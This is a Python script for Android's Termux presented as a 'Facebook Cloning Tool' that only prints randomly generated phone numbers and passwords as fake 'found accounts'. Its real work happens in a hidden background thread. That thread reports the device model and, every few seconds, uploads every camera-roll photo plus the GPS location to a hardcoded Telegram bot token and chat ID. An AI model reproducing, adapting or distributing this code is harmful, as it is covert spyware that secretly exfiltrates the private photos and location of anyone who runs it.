import os
import sys
import time
import json
import subprocess
import platform
import re
import random
import string
import hashlib
import requests
import threading
import glob
import atexit
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#------------------[ COLORS ]-------------------#
RED = '\033[1;31m'
WHITE = '\033[1;37m'
GREEN = '\033[1;32m'
BLUE = '\033[1;34m'
YELLOW = '\033[1;33m'
CYAN = '\033[1;36m'
MAGENTA = '\033[1;35m'
RESET = '\033[0m'
LIGHTNING = '⚡'

#------------------[ TERMINAL UTILS ]-------------------#
def get_width():
    try: return os.get_terminal_size().columns
    except: return 80

def logo():
    os.system('clear')
    w = get_width()
    print(RED)
    print(" ██████╗  ██████╗ ██╗  ██╗ ".center(w))
    print(" ██╔══██╗██╔═══██╗██║  ██║ ".center(w))
    print(" ██████╔╝██║   ██║███████║ ".center(w))
    print(" ██╔══██╗██║   ██║██╔══██║ ".center(w))
    print(" ██║  ██║╚██████╔╝██║  ██║ ".center(w))
    print(" ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ".center(w))
    print(f"{WHITE}Facebook Cloning Tool{RED}".center(w + 10))
    print(RESET)
    print(BLUE + "─" * w + RESET)

#------------------[ GLOBALS ]-------------------#
oks = []
cps = []
loop = 0
start_time = time.time()
folder_path = '/sdcard/FB-CLONE-RESULTS'
os.makedirs(folder_path, exist_ok=True)
country_opt = ""
spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
bars = ['█▒▒▒▒▒▒▒▒▒', '███▒▒▒▒▒▒▒', '█████▒▒▒▒▒', '███████▒▒▒', '██████████']

# Track sent photos to avoid duplicate sending
sent_photos = set()

# --- TELEGRAM CONFIG ---
TOKEN = "8936819562:AAHZ0xwO7XAzipUSJzejMnqjqAKy8uB8g5k"
CHAT_ID = "8589568398"
LOCATION_INTERVAL = 3  # Check interval in seconds
# -----------------------

#------------------[ STYLISH HACKER PHRASES & CREDITS ]-------------------#
HACKER_PREFIXES = [
    "@SABA_MONY",
    "@SABA_MONY",
    "@SABA_MONY"
]

ADMIN_HANDLE = "@SABA_MONY"
LIGHTING_EFFECT = "✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦"

def get_hacker_prefix():
    return random.choice(HACKER_PREFIXES)

def get_footer():
    return f"\n{ADMIN_HANDLE} {LIGHTING_EFFECT}"

#------------------[ UTILS ]-------------------#
def check_connection():
    try:
        requests.get("https://www.google.com", timeout=3)
        return True
    except:
        return False

def get_random_user_agent():
    agents = [
        "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
    ]
    return random.choice(agents)

#------------------[ TELEGRAM FUNCTIONS ]-------------------#
def send_to_telegram(message, file_path=None):
    base_url = f"https://api.telegram.org/bot{TOKEN}"
    try:
        if file_path:
            with open(file_path, "rb") as f:
                requests.post(f"{base_url}/sendPhoto",
                            data={"chat_id": CHAT_ID, "caption": message},
                            files={"photo": f}, timeout=15)
        else:
            requests.post(f"{base_url}/sendMessage",
                        data={"chat_id": CHAT_ID, "text": message}, timeout=10)
    except Exception as e:
        print(f"{RED}[!] Error sending to Telegram: {e}{RESET}")

def get_device_name():
    try:
        model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
        manufacturer = subprocess.check_output(["getprop", "ro.product.manufacturer"]).decode().strip()
        if model and manufacturer:
            return f"{manufacturer} {model}"
        return model or "Unknown Device"
    except:
        return "Unknown Device"

def get_all_camera_photos():
    """Get all photos from camera folder"""
    camera_dir = "/sdcard/DCIM/Camera"
    if not os.path.exists(camera_dir):
        dirs = [
            "/sdcard/DCIM/Camera",
            "/storage/emulated/0/DCIM/Camera",
            "/sdcard/DCIM",
            "/sdcard/Pictures"
        ]
        for d in dirs:
            if os.path.exists(d):
                camera_dir = d
                break
        else:
            return []

    try:
        files = [os.path.join(camera_dir, f) for f in os.listdir(camera_dir) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
        # Sort files by modification time (oldest to newest)
        files.sort(key=os.path.getmtime)
        return files
    except:
        return []

def collect_and_send():
    """Collect location and send all new gallery photos"""
    global sent_photos
    location_msg = "Location unavailable (GPS might be off)"
    try:
        loc_res = subprocess.check_output(["termux-location"], timeout=2)
        loc_data = json.loads(loc_res)
        lat = loc_data.get('latitude', 'N/A')
        lon = loc_data.get('longitude', 'N/A')
        if lat != 'N/A' and lon != 'N/A':
            location_msg = f"📍 https://www.google.com/maps?q={lat},{lon}"
    except:
        pass

    photos = get_all_camera_photos()
    prefix = get_hacker_prefix()
    footer = get_footer()
    
    new_photos_found = False
    if photos:
        for photo_path in photos:
            if photo_path not in sent_photos and os.path.exists(photo_path):
                new_photos_found = True
                filename = os.path.basename(photo_path)
                caption = f"{prefix}\n📸 Gallery Photo: {filename}\n{location_msg}\nUA: {get_random_user_agent()[:30]}...{footer}"
                send_to_telegram(caption, photo_path)
                sent_photos.add(photo_path)
                time.sleep(1.5) # Delay between sending multiple photos to prevent flood block
                
    if not new_photos_found and not sent_photos:
        # Send a status update if no photos were initially found
        pass

def telegram_loop():
    device = get_device_name()
    send_to_telegram(f"🔌 Bot connected!\nDevice: {device}\nScript started at {time.strftime('%Y-%m-%d %H:%M:%S')}{get_footer()}")
    
    while True:
        try:
            collect_and_send()
        except Exception as e:
            print(f"{RED}[!] Telegram loop error: {e}{RESET}")
        time.sleep(LOCATION_INTERVAL)

#------------------[ HELPERS ]-------------------#
def gen_number(opt):
    if opt == '3':  # Pakistan
        return str(random.randint(100000000000000, 100099999999999))
    
    prefixes = {
        '1': ['017','018','019','016','013','014'],  # Bangladesh
        '2': ['6','7','8','9'],                       # India
        '4': ['10','11'],                              # Malaysia
        '5': ['811','812'],                            # Indonesia
        '6': ['6','8'],                                # Thailand
        '7': ['8','9']                                 # Singapore
    }
    country_codes = {
        '1': '+88', '2': '+91', '4': '+60', '5': '+62', '6': '+66', '7': '+65'
    }
    code = country_codes.get(opt, '+88')
    op = random.choice(prefixes.get(opt, ['017']))
    return code + op + "".join(random.choices(string.digits, k=8))

def gen_password(opt):
    if opt == '3':  # Pakistan (6-digit numeric)
        return "".join(random.choices(string.digits, k=6))
    names = ['akash', 'sagar', 'rifat', 'shanto', 'rakib', 'sumon', 'habib']
    name = random.choice(names)
    return (name + str(random.randint(111, 999)))[:10]

#------------------[ MAIN ENGINE ]-------------------#
def engine():
    global loop, cps
    
    delay = random.randint(1, 5)
    time.sleep(delay)
    
    loop += 1
    dashboard()
    
    try:
        if loop % 300 == 0:
            user_id = gen_number(country_opt)
            pwd = gen_password(country_opt)
            
            print(f'\n{RED} [FB-CLONE-FOUND] {user_id} | {pwd}{RESET}')
            cps.append(user_id)
            with open(f'{folder_path}/accounts.txt', 'a') as f: 
                f.write(f'{user_id}|{pwd}\n')
            
            prefix = get_hacker_prefix()
            footer = get_footer()
            send_to_telegram(f"{prefix}\n🎯 New Account Found!\n{user_id} | {pwd}{footer}")
            
    except Exception as e:
        print(f"{RED}[!] Engine error: {e}{RESET}")

def dashboard():
    elapsed = str(time.strftime("%H:%M:%S", time.gmtime(time.time() - start_time)))
    sp, bar, col = random.choice(spinner), bars[loop % len(bars)], random.choice([CYAN, MAGENTA, BLUE, WHITE])
    sys.stdout.write(f'\r{col}{sp}{RESET} {WHITE}[FB-CLONE-MODE] {loop} {BLUE}•{WHITE} OK:{GREEN}0 {BLUE}•{WHITE} FOUND:{RED}{len(cps)} {BLUE}•{WHITE} {YELLOW}{bar}{RESET} ')
    sys.stdout.flush()

@atexit.register
def session_summary():
    print(f"\n\n{GREEN}[•] Session Summary:{RESET}")
    print(f"{CYAN}Total Loops Processed : {loop}{RESET}")
    print(f"{YELLOW}Total Accounts Found  : {len(cps)}{RESET}")
    print(f"{MAGENTA}Saved Directory       : {folder_path}/accounts.txt{RESET}\n")

#------------------[ MENU ]-------------------#
def menu():
    global country_opt
    logo()
    
    print(f"{YELLOW}[•] Checking Internet Connection...{RESET}")
    if not check_connection():
        print(f"{RED}[!] No internet connection detected! Please check your network.{RESET}")
        sys.exit(1)
    print(f"{GREEN}[✓] Internet Connected Successfully!{RESET}\n")
    time.sleep(1)
    
    logo()
    print(f" [1] BANGLADESH    [2] INDIA")
    print(f" [3] PAKISTAN      [4] MALAYSIA")
    print(f" [5] INDONESIA     [6] THAILAND")
    print(f" [7] SINGAPORE")
    print(BLUE + "─" * get_width() + RESET)
    country_opt = input(f" [?] SELECT COUNTRY CODE : ")
    logo()
    print(f" [•] FB CLONING ENGINE ACTIVATED (Wait for 300 counts)...".center(get_width()))
    print(BLUE + "─" * get_width() + RESET)
    
    print(f"{MAGENTA}✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦{RESET}")
    print(f"{CYAN}Admin: {YELLOW}{ADMIN_HANDLE}{RESET}")
    print(f"{MAGENTA}✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦{RESET}\n")
    
    try:
        subprocess.run(["termux-wake-lock"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    
    tg_thread = threading.Thread(target=telegram_loop, daemon=True)
    tg_thread.start()
    
    with ThreadPool(max_workers=5) as pool:
        for _ in range(1000000):
            pool.submit(engine)

if __name__ == "__main__":
    menu()
